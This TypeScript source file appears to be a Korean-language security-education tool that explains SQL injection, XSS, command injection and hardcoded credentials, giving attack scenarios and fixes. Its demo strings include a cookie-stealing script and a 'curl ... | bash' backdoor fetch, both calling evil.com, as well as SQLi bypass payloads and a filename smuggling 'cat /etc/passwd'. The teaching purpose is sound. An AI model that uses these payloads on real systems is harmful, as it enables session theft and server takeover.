import { z } from 'zod';
import { getRuleById, ALL_RULES } from '../rules/index.js';
import { getKnowledgeByCwe } from '../knowledge/portswigger-remediation.js';

export const explainVulnSchema = z.object({
  vulnerability_id: z.string().describe('룰 ID (SCG-xxx) 또는 CWE ID (CWE-xx)'),
  code_context: z.string().optional().describe('취약점이 존재하는 코드 컨텍스트'),
  detail_level: z
    .enum(['beginner', 'intermediate', 'expert'])
    .default('intermediate')
    .describe('설명 상세도 (초급/중급/고급)'),
  include_demo: z.boolean().default(true).describe('공격 데모 포함 여부'),
});

export type ExplainVulnInput = z.infer<typeof explainVulnSchema>;

const CWE_DETAILS: Record<string, { name: string; nameKo: string; detailedKo: Record<string, string> }> = {
  'CWE-89': {
    name: 'SQL Injection',
    nameKo: 'SQL 인젝션',
    detailedKo: {
      beginner: `SQL 인젝션은 해커가 여러분의 데이터베이스에 "몰래 명령"을 보내는 공격입니다.

비유하면: 도서관에서 "해리포터 빌려주세요"라고 요청해야 하는데, "해리포터 빌려주고 모든 회원정보도 주세요"라고 요청하는 것과 같습니다. 도서관 직원(서버)이 요청을 그대로 처리해버리면 모든 정보가 유출됩니다.`,
      intermediate: `SQL 인젝션은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생합니다. 공격자는 입력값에 SQL 구문을 삽입하여 의도하지 않은 쿼리를 실행합니다.

공격 벡터:
- Union-based: UNION SELECT로 다른 테이블 데이터 추출
- Boolean-based blind: 참/거짓 응답 차이로 데이터 유추
- Time-based blind: SLEEP()을 이용한 지연 기반 추출
- Error-based: 에러 메시지에서 정보 추출
- Stacked queries: 세미콜론으로 추가 쿼리 실행`,
      expert: `SQL 인젝션은 CWE-89로 분류되며, CVSS 기본 점수 9.8의 Critical 취약점입니다.

고급 공격 기법:
- Second-order injection: 저장 후 나중에 실행되는 페이로드
- Out-of-band (OOB): DNS/HTTP를 통한 데이터 유출
- WAF bypass: 주석, 인코딩, 대소문자 혼용으로 필터 우회
- Polyglot payloads: 여러 컨텍스트에서 동작하는 페이로드
- Automated exploitation: sqlmap, Havij 등 자동화 도구

방어 심화:
- Prepared Statement (1차 방어)
- Input validation - allowlist (2차 방어)
- Least privilege DB accounts (3차 방어)
- WAF rules (4차 방어)
- Query parameterization at ORM level`,
    },
  },
  'CWE-79': {
    name: 'Cross-Site Scripting (XSS)',
    nameKo: '크로스 사이트 스크립팅 (XSS)',
    detailedKo: {
      beginner: `XSS는 해커가 웹사이트에 악성 스크립트를 "몰래 심는" 공격입니다.

비유하면: 공지사항 게시판에 "안녕하세요"가 아니라, 누가 읽으면 자동으로 개인정보를 빼가는 장치를 심어놓는 것입니다.

타입:
- Stored XSS: 서버에 저장되어 다른 사용자가 볼 때 실행
- Reflected XSS: URL에 포함되어 클릭하면 실행
- DOM XSS: 브라우저 내에서 JavaScript로 실행`,
      intermediate: `XSS는 신뢰할 수 없는 데이터가 적절한 인코딩 없이 HTML/JavaScript에 삽입될 때 발생합니다.

공격 페이로드 예시:
- <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
- <img onerror="..." src=x>
- <svg onload="...">
- javascript:alert(document.domain)

영향:
- 세션 하이재킹 (쿠키 탈취)
- 키로깅 (입력 캡처)
- 피싱 (가짜 로그인 폼 삽입)
- 웜 전파 (자동 게시물 작성)`,
      expert: `XSS는 Context-dependent output encoding이 핵심 방어입니다.

인코딩 컨텍스트:
- HTML Body: HTML entity encoding (&lt; &gt; etc)
- HTML Attribute: Attribute encoding
- JavaScript: JavaScript encoding (\\xHH)
- URL: Percent encoding (%HH)
- CSS: CSS encoding (\\HHHHHH)

고급 방어:
- Content-Security-Policy (CSP) with nonce/hash
- Trusted Types API
- DOM sanitization (DOMPurify)
- Subresource Integrity (SRI)`,
    },
  },
  'CWE-78': {
    name: 'OS Command Injection',
    nameKo: 'OS 명령어 인젝션',
    detailedKo: {
      beginner: 'OS 명령어 인젝션은 해커가 서버 컴퓨터에 직접 명령을 내리는 공격입니다. 서버가 사용자 입력을 시스템 명령어에 그대로 넣으면, 해커가 서버를 완전히 장악할 수 있습니다.',
      intermediate: '사용자 입력이 exec(), system() 등 시스템 명령어 실행 함수에 전달될 때 발생합니다. 공격자는 ;, |, &&, || 등의 메타 문자를 이용하여 추가 명령을 실행합니다.',
      expert: '명령어 인젝션 방어는 execFile()과 같은 인자 배열 기반 API 사용이 최선입니다. Shell interpolation이 발생하지 않아 메타 문자가 무효화됩니다. 불가피하게 shell을 사용해야 한다면 allowlist 기반 입력 검증을 적용하세요.',
    },
  },
  'CWE-798': {
    name: 'Hardcoded Credentials',
    nameKo: '하드코딩된 인증정보',
    detailedKo: {
      beginner: '소스코드에 비밀번호나 API 키를 직접 적어놓는 것입니다. 소스코드가 유출되면 (GitHub 실수 업로드 등) 모든 시크릿이 노출됩니다.',
      intermediate: '하드코딩된 시크릿은 소스코드 저장소, 빌드 산출물, 클라이언트 번들 등 여러 경로로 유출될 수 있습니다. 환경변수, AWS Secrets Manager, HashiCorp Vault 등을 사용하세요.',
      expert: '시크릿 관리 체계: 환경변수(기본) → Sealed Secrets(K8s) → External Secrets Operator → Cloud KMS/Vault. git-secrets, trufflehog, gitleaks 등으로 커밋 전 스캔을 CI에 통합하세요.',
    },
  },
};

export function handleExplainVuln(input: ExplainVulnInput) {
  const { vulnerability_id, detail_level, include_demo, code_context } = input;

  let rule = getRuleById(vulnerability_id);

  if (!rule) {
    const cweMatch = vulnerability_id.match(/CWE-(\d+)/i);
    if (cweMatch) {
      const cweId = `CWE-${cweMatch[1]}`;
      rule = ALL_RULES.find((r) => r.cweId === cweId);
    }
  }

  if (!rule) {
    return {
      content: [
        {
          type: 'text' as const,
          text: `⚠️ 취약점 ID를 찾을 수 없습니다: ${vulnerability_id}\n\n사용 가능한 ID 형식:\n- 룰 ID: SCG-INJ-SQL-001\n- CWE ID: CWE-89`,
        },
      ],
    };
  }

  const cweDetail = CWE_DETAILS[rule.cweId];
  const lines: string[] = [];

  lines.push(`## 🔍 취약점 상세: ${rule.titleKo}`);
  lines.push('');
  lines.push(`| 항목 | 값 |`);
  lines.push(`|---|---|`);
  lines.push(`| 룰 ID | ${rule.id} |`);
  lines.push(`| CWE | ${rule.cweId} |`);
  lines.push(`| OWASP | ${rule.category} |`);
  lines.push(`| 심각도 | ${rule.severity.toUpperCase()} |`);
  lines.push(`| 신뢰도 | ${rule.confidence} |`);
  lines.push('');

  if (cweDetail) {
    lines.push('### 📖 설명');
    lines.push('');
    lines.push(cweDetail.detailedKo[detail_level] ?? cweDetail.detailedKo.intermediate);
    lines.push('');
  } else {
    lines.push('### 📖 설명');
    lines.push('');
    lines.push(rule.descriptionKo);
    lines.push('');
  }

  if (include_demo) {
    lines.push('### 🎯 공격 시나리오');
    lines.push('');
    const scenario = generateDetailedScenario(rule.cweId);
    lines.push(scenario);
    lines.push('');
  }

  if (code_context) {
    lines.push('### 📝 코드 분석');
    lines.push('');
    lines.push('제공된 코드에서 이 취약점이 발생하는 이유:');
    lines.push(`이 코드는 ${rule.descriptionKo}`);
    lines.push('');
  }

  lines.push('### ✅ 수정 방법');
  lines.push('');
  lines.push(rule.remediation.descriptionKo);
  if (rule.remediation.secureExample) {
    lines.push('');
    lines.push('```');
    lines.push(rule.remediation.secureExample);
    lines.push('```');
  }
  lines.push('');

  const psKnowledge = getKnowledgeByCwe(rule.cweId);
  if (psKnowledge) {
    lines.push('### 🛡️ 전문가 방어 기법 (PortSwigger)');
    lines.push('');
    lines.push(`**공격 원리:** ${psKnowledge.attackMechanismKo}`);
    lines.push('');
    lines.push('**방어 기법:**');
    for (const tech of psKnowledge.preventionTechniquesKo) {
      lines.push(`- ${tech}`);
    }
    lines.push('');
    lines.push('**개발자 흔한 실수:**');
    for (const mistake of psKnowledge.commonMistakesKo) {
      lines.push(`- ❌ ${mistake}`);
    }
    lines.push('');
  }

  lines.push('### 📚 참고 자료');
  for (const ref of rule.remediation.references) {
    lines.push(`- ${ref}`);
  }
  if (psKnowledge) {
    lines.push(`- ${psKnowledge.portswiggerUrl}`);
  }

  return {
    content: [{ type: 'text' as const, text: lines.join('\n') }],
  };
}

function generateDetailedScenario(cweId: string): string {
  const demos: Record<string, string> = {
    'CWE-89': `**단계별 공격 시나리오:**

1. 공격자가 로그인 폼에서 이메일 필드에 입력:
   \`' OR '1'='1' --\`

2. 서버에서 생성되는 SQL:
   \`SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = '...'\`

3. 조건 \`'1'='1'\`이 항상 참이므로 모든 사용자 레코드가 반환됨

4. 첫 번째 사용자(보통 admin)로 로그인 성공

**고급 공격:**
\`' UNION SELECT username, password, null FROM admin_users --\`
→ 관리자 테이블의 인증정보를 탈취`,
    'CWE-79': `**Stored XSS 공격 시나리오:**

1. 공격자가 게시판에 글 작성:
   \`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`

2. 다른 사용자가 게시글을 열람

3. 스크립트가 실행되어 피해자의 세션 쿠키가 공격자 서버로 전송

4. 공격자가 탈취한 쿠키로 피해자의 세션을 하이재킹

**CSP 우회 예시:**
\`<img src=x onerror="eval(atob('ZmV0Y2goJ...'))">\``,
    'CWE-78': `**공격 시나리오:**

1. 파일 변환 기능에서 파일명 입력:
   \`image.png; cat /etc/passwd\`

2. 서버에서 실행되는 명령:
   \`convert image.png; cat /etc/passwd output.jpg\`

3. 세미콜론 이후의 명령이 별도로 실행되어 시스템 파일 노출

4. 더 심각한 공격: \`; curl https://evil.com/backdoor.sh | bash\``,
    'CWE-798': `**유출 시나리오:**

1. 개발자가 API 키를 코드에 하드코딩
2. GitHub에 public으로 push (실수)
3. 자동 스캐닝 봇이 수초 내에 키 탈취
4. AWS 키의 경우: 크립토마이닝 인스턴스 대량 생성 → 수천만원 과금

실제 사례: 2023년 한 스타트업이 AWS 키 유출로 약 $45,000 과금 피해`,
  };

  return demos[cweId] ?? '이 취약점을 악용하면 시스템의 기밀성, 무결성, 가용성이 침해될 수 있습니다.';
}
